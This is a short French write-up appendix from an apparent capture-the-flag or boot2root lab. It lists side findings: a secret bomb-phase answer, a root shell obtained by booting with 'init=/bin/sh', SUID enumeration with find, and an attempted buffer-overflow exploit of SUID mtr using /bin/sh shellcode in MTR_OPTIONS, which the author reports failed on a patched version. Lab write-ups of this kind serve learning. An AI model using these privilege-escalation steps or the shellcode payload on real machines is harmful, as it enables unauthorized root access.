# Unlisted

Ces writeups concerne les trouvailles que nous avons présentés en correction, sans les inclure dans un writeup en tant que tel.

## laurie : Bombe (Phase secrete)

Il y a possibilité d'activer une phase secrete en écrivant `9 austinpowers` à l'étape 4, la solution de la phase secrete est `1001`, cependant elle n'accorde rien de plus.

## Boot init

Cette methode n'est utilisable qu'en ayant un accès physique à la machine.
Activer les commandes boot sur la VM/la machine et lancer la commande suivante :
```
live init=/bin/sh
```
Afin d'être root sur la machine.

## Débuts de piste supplémentaires

- Un service host sur le port 9000 et est requetable depuis la VM ou depuis une connection SSH
- Le service PHP5 est lancé en tant que root
- Un compte ft_root sur la machine est present, cependant son dossier home ne contient que les dossiers mail
- En utilisant la commande `find / -perm -u=s -type f 2>/dev/null`, on remarque qu'on peut executer l'executable sensible `mtr` avec les droits de root, d'après l'advisory suivant : `https://securitytracker.com/id/1003754` je tente une execution par shellcode via variable d'environnement : `export MTR_OPTIONS=$(python -c 'print "A " * 130 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')`, cependant la faille semble patchée, ce qui se confirme par `mtr -v` qui retourne `mtr 0.80` alors que la faille ne fonctionne que jusque la version 0.46


